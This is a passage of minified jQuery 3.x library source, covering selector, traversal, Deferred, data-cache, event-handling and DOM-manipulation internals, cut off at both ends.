n;l&&(t=t.parentNode),e=e.slice(o.shift().value.length)}i=G.needsContext.test(e)?0:o.length;while(i--){if(a=o[i],b.relative[s=a.type])break;if((u=b.find[s])&&(r=u(a.matches[0].replace(te,ne),ee.test(o[0].type)&&ye(t.parentNode)||t))){if(o.splice(i,1),!(e=r.length&&xe(o)))return H.apply(n,r),n;break}}}return(l||f(e,c))(r,t,!E,n,!t||ee.test(e)&&ye(t.parentNode)||t),n},d.sortStable=S.split("").sort(D).join("")===S,d.detectDuplicates=!!l,T(),d.sortDetached=ce(function(e){return 1&e.compareDocumentPosition(C.createElement("fieldset"))}),ce(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||fe("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),d.attributes&&ce(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||fe("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),ce(function(e){return null==e.getAttribute("disabled")})||fe(R,function(e,t,n){var r;if(!n)return!0===e[t]?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),se}(C);S.find=d,S.expr=d.selectors,S.expr[":"]=S.expr.pseudos,S.uniqueSort=S.unique=d.uniqueSort,S.text=d.getText,S.isXMLDoc=d.isXML,S.contains=d.contains,S.escapeSelector=d.escape;var h=function(e,t,n){var r=[],i=void 0!==n;while((e=e[t])&&9!==e.nodeType)if(1===e.nodeType){if(i&&S(e).is(n))break;r.push(e)}return r},T=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},k=S.expr.match.needsContext;function A(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var N=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function D(e,n,r){return m(n)?S.grep(e,function(e,t){return!!n.call(e,t,e)!==r}):n.nodeType?S.grep(e,function(e){return e===n!==r}):"string"!=typeof n?S.grep(e,function(e){return-1<i.call(n,e)!==r}):S.filter(n,e,r)}S.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?S.find.matchesSelector(r,e)?[r]:[]:S.find.matches(e,S.grep(t,function(e){return 1===e.nodeType}))},S.fn.extend({find:function(e){var t,n,r=this.length,i=this;if("string"!=typeof e)return this.pushStack(S(e).filter(function(){for(t=0;t<r;t++)if(S.contains(i[t],this))return!0}));for(n=this.pushStack([]),t=0;t<r;t++)S.find(e,i[t],n);return 1<r?S.uniqueSort(n):n},filter:function(e){return this.pushStack(D(this,e||[],!1))},not:function(e){return this.pushStack(D(this,e||[],!0))},is:function(e){return!!D(this,"string"==typeof e&&k.test(e)?S(e):e||[],!1).length}});var j,q=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(S.fn.init=function(e,t,n){var r,i;if(!e)return this;if(n=n||j,"string"==typeof e){if(!(r="<"===e[0]&&">"===e[e.length-1]&&3<=e.length?[null,e,null]:q.exec(e))||!r[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(r[1]){if(t=t instanceof S?t[0]:t,S.merge(this,S.parseHTML(r[1],t&&t.nodeType?t.ownerDocument||t:E,!0)),N.test(r[1])&&S.isPlainObject(t))for(r in t)m(this[r])?this[r](t[r]):this.attr(r,t[r]);return this}return(i=E.getElementById(r[2]))&&(this[0]=i,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):m(e)?void 0!==n.ready?n.ready(e):e(S):S.makeArray(e,this)}).prototype=S.fn,j=S(E);var L=/^(?:parents|prev(?:Until|All))/,H={children:!0,contents:!0,next:!0,prev:!0};function O(e,t){while((e=e[t])&&1!==e.nodeType);return e}S.fn.extend({has:function(e){var t=S(e,this),n=t.length;return this.filter(function(){for(var e=0;e<n;e++)if(S.contains(this,t[e]))return!0})},closest:function(e,t){var n,r=0,i=this.length,o=[],a="string"!=typeof e&&S(e);if(!k.test(e))for(;r<i;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?-1<a.index(n):1===n.nodeType&&S.find.matchesSelector(n,e))){o.push(n);break}return this.pushStack(1<o.length?S.uniqueSort(o):o)},index:function(e){return e?"string"==typeof e?i.call(S(e),this[0]):i.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(S.uniqueSort(S.merge(this.get(),S(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),S.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return h(e,"parentNode")},parentsUntil:function(e,t,n){return h(e,"parentNode",n)},next:function(e){return O(e,"nextSibling")},prev:function(e){return O(e,"previousSibling")},nextAll:function(e){return h(e,"nextSibling")},prevAll:function(e){return h(e,"previousSibling")},nextUntil:function(e,t,n){return h(e,"nextSibling",n)},prevUntil:function(e,t,n){return h(e,"previousSibling",n)},siblings:function(e){return T((e.parentNode||{}).firstChild,e)},children:function(e){return T(e.firstChild)},contents:function(e){return null!=e.contentDocument&&r(e.contentDocument)?e.contentDocument:(A(e,"template")&&(e=e.content||e),S.merge([],e.childNodes))}},function(r,i){S.fn[r]=function(e,t){var n=S.map(this,i,e);return"Until"!==r.slice(-5)&&(t=e),t&&"string"==typeof t&&(n=S.filter(t,n)),1<this.length&&(H[r]||S.uniqueSort(n),L.test(r)&&n.reverse()),this.pushStack(n)}});var P=/[^\x20\t\r\n\f]+/g;function R(e){return e}function M(e){throw e}function I(e,t,n,r){var i;try{e&&m(i=e.promise)?i.call(e).done(t).fail(n):e&&m(i=e.then)?i.call(e,t,n):t.apply(void 0,[e].slice(r))}catch(e){n.apply(void 0,[e])}}S.Callbacks=function(r){var e,n;r="string"==typeof r?(e=r,n={},S.each(e.match(P)||[],function(e,t){n[t]=!0}),n):S.extend({},r);var i,t,o,a,s=[],u=[],l=-1,c=function(){for(a=a||r.once,o=i=!0;u.length;l=-1){t=u.shift();while(++l<s.length)!1===s[l].apply(t[0],t[1])&&r.stopOnFalse&&(l=s.length,t=!1)}r.memory||(t=!1),i=!1,a&&(s=t?[]:"")},f={add:function(){return s&&(t&&!i&&(l=s.length-1,u.push(t)),function n(e){S.each(e,function(e,t){m(t)?r.unique&&f.has(t)||s.push(t):t&&t.length&&"string"!==w(t)&&n(t)})}(arguments),t&&!i&&c()),this},remove:function(){return S.each(arguments,function(e,t){var n;while(-1<(n=S.inArray(t,s,n)))s.splice(n,1),n<=l&&l--}),this},has:function(e){return e?-1<S.inArray(e,s):0<s.length},empty:function(){return s&&(s=[]),this},disable:function(){return a=u=[],s=t="",this},disabled:function(){return!s},lock:function(){return a=u=[],t||i||(s=t=""),this},locked:function(){return!!a},fireWith:function(e,t){return a||(t=[e,(t=t||[]).slice?t.slice():t],u.push(t),i||c()),this},fire:function(){return f.fireWith(this,arguments),this},fired:function(){return!!o}};return f},S.extend({Deferred:function(e){var o=[["notify","progress",S.Callbacks("memory"),S.Callbacks("memory"),2],["resolve","done",S.Callbacks("once memory"),S.Callbacks("once memory"),0,"resolved"],["reject","fail",S.Callbacks("once memory"),S.Callbacks("once memory"),1,"rejected"]],i="pending",a={state:function(){return i},always:function(){return s.done(arguments).fail(arguments),this},"catch":function(e){return a.then(null,e)},pipe:function(){var i=arguments;return S.Deferred(function(r){S.each(o,function(e,t){var n=m(i[t[4]])&&i[t[4]];s[t[1]](function(){var e=n&&n.apply(this,arguments);e&&m(e.promise)?e.promise().progress(r.notify).done(r.resolve).fail(r.reject):r[t[0]+"With"](this,n?[e]:arguments)})}),i=null}).promise()},then:function(t,n,r){var u=0;function l(i,o,a,s){return function(){var n=this,r=arguments,e=function(){var e,t;if(!(i<u)){if((e=a.apply(n,r))===o.promise())throw new TypeError("Thenable self-resolution");t=e&&("object"==typeof e||"function"==typeof e)&&e.then,m(t)?s?t.call(e,l(u,o,R,s),l(u,o,M,s)):(u++,t.call(e,l(u,o,R,s),l(u,o,M,s),l(u,o,R,o.notifyWith))):(a!==R&&(n=void 0,r=[e]),(s||o.resolveWith)(n,r))}},t=s?e:function(){try{e()}catch(e){S.Deferred.exceptionHook&&S.Deferred.exceptionHook(e,t.stackTrace),u<=i+1&&(a!==M&&(n=void 0,r=[e]),o.rejectWith(n,r))}};i?t():(S.Deferred.getStackHook&&(t.stackTrace=S.Deferred.getStackHook()),C.setTimeout(t))}}return S.Deferred(function(e){o[0][3].add(l(0,e,m(r)?r:R,e.notifyWith)),o[1][3].add(l(0,e,m(t)?t:R)),o[2][3].add(l(0,e,m(n)?n:M))}).promise()},promise:function(e){return null!=e?S.extend(e,a):a}},s={};return S.each(o,function(e,t){var n=t[2],r=t[5];a[t[1]]=n.add,r&&n.add(function(){i=r},o[3-e][2].disable,o[3-e][3].disable,o[0][2].lock,o[0][3].lock),n.add(t[3].fire),s[t[0]]=function(){return s[t[0]+"With"](this===s?void 0:this,arguments),this},s[t[0]+"With"]=n.fireWith}),a.promise(s),e&&e.call(s,s),s},when:function(e){var n=arguments.length,t=n,r=Array(t),i=s.call(arguments),o=S.Deferred(),a=function(t){return function(e){r[t]=this,i[t]=1<arguments.length?s.call(arguments):e,--n||o.resolveWith(r,i)}};if(n<=1&&(I(e,o.done(a(t)).resolve,o.reject,!n),"pending"===o.state()||m(i[t]&&i[t].then)))return o.then();while(t--)I(i[t],a(t),o.reject);return o.promise()}});var W=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;S.Deferred.exceptionHook=function(e,t){C.console&&C.console.warn&&e&&W.test(e.name)&&C.console.warn("jQuery.Deferred exception: "+e.message,e.stack,t)},S.readyException=function(e){C.setTimeout(function(){throw e})};var F=S.Deferred();function B(){E.removeEventListener("DOMContentLoaded",B),C.removeEventListener("load",B),S.ready()}S.fn.ready=function(e){return F.then(e)["catch"](function(e){S.readyException(e)}),this},S.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--S.readyWait:S.isReady)||(S.isReady=!0)!==e&&0<--S.readyWait||F.resolveWith(E,[S])}}),S.ready.then=F.then,"complete"===E.readyState||"loading"!==E.readyState&&!E.documentElement.doScroll?C.setTimeout(S.ready):(E.addEventListener("DOMContentLoaded",B),C.addEventListener("load",B));var $=function(e,t,n,r,i,o,a){var s=0,u=e.length,l=null==n;if("object"===w(n))for(s in i=!0,n)$(e,t,s,n[s],!0,o,a);else if(void 0!==r&&(i=!0,m(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(S(e),n)})),t))for(;s<u;s++)t(e[s],n,a?r:r.call(e[s],s,t(e[s],n)));return i?e:l?t.call(e):u?t(e[0],n):o},_=/^-ms-/,z=/-([a-z])/g;function U(e,t){return t.toUpperCase()}function X(e){return e.replace(_,"ms-").replace(z,U)}var V=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};function G(){this.expando=S.expando+G.uid++}G.uid=1,G.prototype={cache:function(e){var t=e[this.expando];return t||(t={},V(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var r,i=this.cache(e);if("string"==typeof t)i[X(t)]=n;else for(r in t)i[X(r)]=t[r];return i},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][X(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r=e[this.expando];if(void 0!==r){if(void 0!==t){n=(t=Array.isArray(t)?t.map(X):(t=X(t))in r?[t]:t.match(P)||[]).length;while(n--)delete r[t[n]]}(void 0===t||S.isEmptyObject(r))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!S.isEmptyObject(t)}};var Y=new G,Q=new G,J=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,K=/[A-Z]/g;function Z(e,t,n){var r,i;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(K,"-$&").toLowerCase(),"string"==typeof(n=e.getAttribute(r))){try{n="true"===(i=n)||"false"!==i&&("null"===i?null:i===+i+""?+i:J.test(i)?JSON.parse(i):i)}catch(e){}Q.set(e,t,n)}else n=void 0;return n}S.extend({hasData:function(e){return Q.hasData(e)||Y.hasData(e)},data:function(e,t,n){return Q.access(e,t,n)},removeData:function(e,t){Q.remove(e,t)},_data:function(e,t,n){return Y.access(e,t,n)},_removeData:function(e,t){Y.remove(e,t)}}),S.fn.extend({data:function(n,e){var t,r,i,o=this[0],a=o&&o.attributes;if(void 0===n){if(this.length&&(i=Q.get(o),1===o.nodeType&&!Y.get(o,"hasDataAttrs"))){t=a.length;while(t--)a[t]&&0===(r=a[t].name).indexOf("data-")&&(r=X(r.slice(5)),Z(o,r,i[r]));Y.set(o,"hasDataAttrs",!0)}return i}return"object"==typeof n?this.each(function(){Q.set(this,n)}):$(this,function(e){var t;if(o&&void 0===e)return void 0!==(t=Q.get(o,n))?t:void 0!==(t=Z(o,n))?t:void 0;this.each(function(){Q.set(this,n,e)})},null,e,1<arguments.length,null,!0)},removeData:function(e){return this.each(function(){Q.remove(this,e)})}}),S.extend({queue:function(e,t,n){var r;if(e)return t=(t||"fx")+"queue",r=Y.get(e,t),n&&(!r||Array.isArray(n)?r=Y.access(e,t,S.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||"fx";var n=S.queue(e,t),r=n.length,i=n.shift(),o=S._queueHooks(e,t);"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,function(){S.dequeue(e,t)},o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return Y.get(e,n)||Y.access(e,n,{empty:S.Callbacks("once memory").add(function(){Y.remove(e,[t+"queue",n])})})}}),S.fn.extend({queue:function(t,n){var e=2;return"string"!=typeof t&&(n=t,t="fx",e--),arguments.length<e?S.queue(this[0],t):void 0===n?this:this.each(function(){var e=S.queue(this,t,n);S._queueHooks(this,t),"fx"===t&&"inprogress"!==e[0]&&S.dequeue(this,t)})},dequeue:function(e){return this.each(function(){S.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=S.Deferred(),o=this,a=this.length,s=function(){--r||i.resolveWith(o,[o])};"string"!=typeof e&&(t=e,e=void 0),e=e||"fx";while(a--)(n=Y.get(o[a],e+"queueHooks"))&&n.empty&&(r++,n.empty.add(s));return s(),i.promise(t)}});var ee=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,te=new RegExp("^(?:([+-])=|)("+ee+")([a-z%]*)$","i"),ne=["Top","Right","Bottom","Left"],re=E.documentElement,ie=function(e){return S.contains(e.ownerDocument,e)},oe={composed:!0};re.getRootNode&&(ie=function(e){return S.contains(e.ownerDocument,e)||e.getRootNode(oe)===e.ownerDocument});var ae=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&ie(e)&&"none"===S.css(e,"display")};function se(e,t,n,r){var i,o,a=20,s=r?function(){return r.cur()}:function(){return S.css(e,t,"")},u=s(),l=n&&n[3]||(S.cssNumber[t]?"":"px"),c=e.nodeType&&(S.cssNumber[t]||"px"!==l&&+u)&&te.exec(S.css(e,t));if(c&&c[3]!==l){u/=2,l=l||c[3],c=+u||1;while(a--)S.style(e,t,c+l),(1-o)*(1-(o=s()/u||.5))<=0&&(a=0),c/=o;c*=2,S.style(e,t,c+l),n=n||[]}return n&&(c=+c||+u||0,i=n[1]?c+(n[1]+1)*n[2]:+n[2],r&&(r.unit=l,r.start=c,r.end=i)),i}var ue={};function le(e,t){for(var n,r,i,o,a,s,u,l=[],c=0,f=e.length;c<f;c++)(r=e[c]).style&&(n=r.style.display,t?("none"===n&&(l[c]=Y.get(r,"display")||null,l[c]||(r.style.display="")),""===r.style.display&&ae(r)&&(l[c]=(u=a=o=void 0,a=(i=r).ownerDocument,s=i.nodeName,(u=ue[s])||(o=a.body.appendChild(a.createElement(s)),u=S.css(o,"display"),o.parentNode.removeChild(o),"none"===u&&(u="block"),ue[s]=u)))):"none"!==n&&(l[c]="none",Y.set(r,"display",n)));for(c=0;c<f;c++)null!=l[c]&&(e[c].style.display=l[c]);return e}S.fn.extend({show:function(){return le(this,!0)},hide:function(){return le(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){ae(this)?S(this).show():S(this).hide()})}});var ce,fe,pe=/^(?:checkbox|radio)$/i,de=/<([a-z][^\/\0>\x20\t\r\n\f]*)/i,he=/^$|^module$|\/(?:java|ecma)script/i;ce=E.createDocumentFragment().appendChild(E.createElement("div")),(fe=E.createElement("input")).setAttribute("type","radio"),fe.setAttribute("checked","checked"),fe.setAttribute("name","t"),ce.appendChild(fe),y.checkClone=ce.cloneNode(!0).cloneNode(!0).lastChild.checked,ce.innerHTML="<textarea>x</textarea>",y.noCloneChecked=!!ce.cloneNode(!0).lastChild.defaultValue,ce.innerHTML="<option></option>",y.option=!!ce.lastChild;var ge={thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function ve(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&A(e,t)?S.merge([e],n):n}function ye(e,t){for(var n=0,r=e.length;n<r;n++)Y.set(e[n],"globalEval",!t||Y.get(t[n],"globalEval"))}ge.tbody=ge.tfoot=ge.colgroup=ge.caption=ge.thead,ge.th=ge.td,y.option||(ge.optgroup=ge.option=[1,"<select multiple='multiple'>","</select>"]);var me=/<|&#?\w+;/;function xe(e,t,n,r,i){for(var o,a,s,u,l,c,f=t.createDocumentFragment(),p=[],d=0,h=e.length;d<h;d++)if((o=e[d])||0===o)if("object"===w(o))S.merge(p,o.nodeType?[o]:o);else if(me.test(o)){a=a||f.appendChild(t.createElement("div")),s=(de.exec(o)||["",""])[1].toLowerCase(),u=ge[s]||ge._default,a.innerHTML=u[1]+S.htmlPrefilter(o)+u[2],c=u[0];while(c--)a=a.lastChild;S.merge(p,a.childNodes),(a=f.firstChild).textContent=""}else p.push(t.createTextNode(o));f.textContent="",d=0;while(o=p[d++])if(r&&-1<S.inArray(o,r))i&&i.push(o);else if(l=ie(o),a=ve(f.appendChild(o),"script"),l&&ye(a),n){c=0;while(o=a[c++])he.test(o.type||"")&&n.push(o)}return f}var be=/^key/,we=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,Te=/^([^.]*)(?:\.(.+)|)/;function Ce(){return!0}function Ee(){return!1}function Se(e,t){return e===function(){try{return E.activeElement}catch(e){}}()==("focus"===t)}function ke(e,t,n,r,i,o){var a,s;if("object"==typeof t){for(s in"string"!=typeof n&&(r=r||n,n=void 0),t)ke(e,s,n,r,t[s],o);return e}if(null==r&&null==i?(i=n,r=n=void 0):null==i&&("string"==typeof n?(i=r,r=void 0):(i=r,r=n,n=void 0)),!1===i)i=Ee;else if(!i)return e;return 1===o&&(a=i,(i=function(e){return S().off(e),a.apply(this,arguments)}).guid=a.guid||(a.guid=S.guid++)),e.each(function(){S.event.add(this,t,i,r,n)})}function Ae(e,i,o){o?(Y.set(e,i,!1),S.event.add(e,i,{namespace:!1,handler:function(e){var t,n,r=Y.get(this,i);if(1&e.isTrigger&&this[i]){if(r.length)(S.event.special[i]||{}).delegateType&&e.stopPropagation();else if(r=s.call(arguments),Y.set(this,i,r),t=o(this,i),this[i](),r!==(n=Y.get(this,i))||t?Y.set(this,i,!1):n={},r!==n)return e.stopImmediatePropagation(),e.preventDefault(),n.value}else r.length&&(Y.set(this,i,{value:S.event.trigger(S.extend(r[0],S.Event.prototype),r.slice(1),this)}),e.stopImmediatePropagation())}})):void 0===Y.get(e,i)&&S.event.add(e,i,Ce)}S.event={global:{},add:function(t,e,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,v=Y.get(t);if(V(t)){n.handler&&(n=(o=n).handler,i=o.selector),i&&S.find.matchesSelector(re,i),n.guid||(n.guid=S.guid++),(u=v.events)||(u=v.events=Object.create(null)),(a=v.handle)||(a=v.handle=function(e){return"undefined"!=typeof S&&S.event.triggered!==e.type?S.event.dispatch.apply(t,arguments):void 0}),l=(e=(e||"").match(P)||[""]).length;while(l--)d=g=(s=Te.exec(e[l])||[])[1],h=(s[2]||"").split(".").sort(),d&&(f=S.event.special[d]||{},d=(i?f.delegateType:f.bindType)||d,f=S.event.special[d]||{},c=S.extend({type:d,origType:g,data:r,handler:n,guid:n.guid,selector:i,needsContext:i&&S.expr.match.needsContext.test(i),namespace:h.join(".")},o),(p=u[d])||((p=u[d]=[]).delegateCount=0,f.setup&&!1!==f.setup.call(t,r,h,a)||t.addEventListener&&t.addEventListener(d,a)),f.add&&(f.add.call(t,c),c.handler.guid||(c.handler.guid=n.guid)),i?p.splice(p.delegateCount++,0,c):p.push(c),S.event.global[d]=!0)}},remove:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,v=Y.hasData(e)&&Y.get(e);if(v&&(u=v.events)){l=(t=(t||"").match(P)||[""]).length;while(l--)if(d=g=(s=Te.exec(t[l])||[])[1],h=(s[2]||"").split(".").sort(),d){f=S.event.special[d]||{},p=u[d=(r?f.delegateType:f.bindType)||d]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=o=p.length;while(o--)c=p[o],!i&&g!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(p.splice(o,1),c.selector&&p.delegateCount--,f.remove&&f.remove.call(e,c));a&&!p.length&&(f.teardown&&!1!==f.teardown.call(e,h,v.handle)||S.removeEvent(e,d,v.handle),delete u[d])}else for(d in u)S.event.remove(e,d+t[l],n,r,!0);S.isEmptyObject(u)&&Y.remove(e,"handle events")}},dispatch:function(e){var t,n,r,i,o,a,s=new Array(arguments.length),u=S.event.fix(e),l=(Y.get(this,"events")||Object.create(null))[u.type]||[],c=S.event.special[u.type]||{};for(s[0]=u,t=1;t<arguments.length;t++)s[t]=arguments[t];if(u.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,u)){a=S.event.handlers.call(this,u,l),t=0;while((i=a[t++])&&!u.isPropagationStopped()){u.currentTarget=i.elem,n=0;while((o=i.handlers[n++])&&!u.isImmediatePropagationStopped())u.rnamespace&&!1!==o.namespace&&!u.rnamespace.test(o.namespace)||(u.handleObj=o,u.data=o.data,void 0!==(r=((S.event.special[o.origType]||{}).handle||o.handler).apply(i.elem,s))&&!1===(u.result=r)&&(u.preventDefault(),u.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,u),u.result}},handlers:function(e,t){var n,r,i,o,a,s=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&1<=e.button))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||!0!==l.disabled)){for(o=[],a={},n=0;n<u;n++)void 0===a[i=(r=t[n]).selector+" "]&&(a[i]=r.needsContext?-1<S(i,this).index(l):S.find(i,this,null,[l]).length),a[i]&&o.push(r);o.length&&s.push({elem:l,handlers:o})}return l=this,u<t.length&&s.push({elem:l,handlers:t.slice(u)}),s},addProp:function(t,e){Object.defineProperty(S.Event.prototype,t,{enumerable:!0,configurable:!0,get:m(e)?function(){if(this.originalEvent)return e(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[t]},set:function(e){Object.defineProperty(this,t,{enumerable:!0,configurable:!0,writable:!0,value:e})}})},fix:function(e){return e[S.expando]?e:new S.Event(e)},special:{load:{noBubble:!0},click:{setup:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&Ae(t,"click",Ce),!1},trigger:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&Ae(t,"click"),!0},_default:function(e){var t=e.target;return pe.test(t.type)&&t.click&&A(t,"input")&&Y.get(t,"click")||A(t,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},S.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},S.Event=function(e,t){if(!(this instanceof S.Event))return new S.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?Ce:Ee,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&S.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[S.expando]=!0},S.Event.prototype={constructor:S.Event,isDefaultPrevented:Ee,isPropagationStopped:Ee,isImmediatePropagationStopped:Ee,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=Ce,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=Ce,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=Ce,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},S.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,"char":!0,code:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:function(e){var t=e.button;return null==e.which&&be.test(e.type)?null!=e.charCode?e.charCode:e.keyCode:!e.which&&void 0!==t&&we.test(e.type)?1&t?1:2&t?3:4&t?2:0:e.which}},S.event.addProp),S.each({focus:"focusin",blur:"focusout"},function(e,t){S.event.special[e]={setup:function(){return Ae(this,e,Se),!1},trigger:function(){return Ae(this,e),!0},delegateType:t}}),S.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,i){S.event.special[e]={delegateType:i,bindType:i,handle:function(e){var t,n=e.relatedTarget,r=e.handleObj;return n&&(n===this||S.contains(this,n))||(e.type=r.origType,t=r.handler.apply(this,arguments),e.type=i),t}}}),S.fn.extend({on:function(e,t,n,r){return ke(this,e,t,n,r)},one:function(e,t,n,r){return ke(this,e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,S(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return!1!==t&&"function"!=typeof t||(n=t,t=void 0),!1===n&&(n=Ee),this.each(function(){S.event.remove(this,e,n,t)})}});var Ne=/<script|<style|<link/i,De=/checked\s*(?:[^=]|=\s*.checked.)/i,je=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function qe(e,t){return A(e,"table")&&A(11!==t.nodeType?t:t.firstChild,"tr")&&S(e).children("tbody")[0]||e}function Le(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function He(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function Oe(e,t){var n,r,i,o,a,s;if(1===t.nodeType){if(Y.hasData(e)&&(s=Y.get(e).events))for(i in Y.remove(t,"handle events"),s)for(n=0,r=s[i].length;n<r;n++)S.event.add(t,i,s[i][n]);Q.hasData(e)&&(o=Q.access(e),a=S.extend({},o),Q.set(t,a))}}function Pe(n,r,i,o){r=g(r);var e,t,a,s,u,l,c=0,f=n.length,p=f-1,d=r[0],h=m(d);if(h||1<f&&"string"==typeof d&&!y.checkClone&&De.test(d))return n.each(function(e){var t=n.eq(e);h&&(r[0]=d.call(this,e,t.html())),Pe(t,r,i,o)});if(f&&(t=(e=xe(r,n[0].ownerDocument,!1,n,o)).firstChild,1===e.childNodes.length&&(e=t),t||o)){for(s=(a=S.map(ve(e,"script"),Le)).length;c<f;c++)u=e,c!==p&&(u=S.clone(u,!0,!0),s&&S.merge(a,ve(u,"script"))),i.call(n[c],u,c);if(s)for(l=a[a.length-1].ownerDocument,S.map(a,He),c=0;c<s;c++)u=a[c],he.test(u.type||"")&&!Y.access(u,"globalEval")&&S.contains(l,u)&&(u.src&&"module"!==(u.type||"").toLowerCase()?S._evalUrl&&!u.noModule&&S._evalUrl(u.src,{nonce:u.nonce||u.getAttribute("nonce")},l):b(u.textContent.replace(je,""),u,l))}return n}function Re(e,t,n){for(var r,i=t?S.filter(t,e):e,o=0;null!=(r=i[o]);o++)n||1!==r.nodeType||S.cleanData(ve(r)),r.parentNode&&(n&&ie(r)&&ye(ve(r,"script")),r.parentNode.removeChild(r));return e}S.extend({htmlPrefilter:function(e){return e},clone:function(e,t,n){var r,i,o,a,s,u,l,c=e.cloneNode(!0),f=ie(e);if(!(y.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||S.isXMLDoc(e)))for(a=ve(c),r=0,i=(o=ve(e)).length;r<i;r++)s=o[r],u=a[r],void 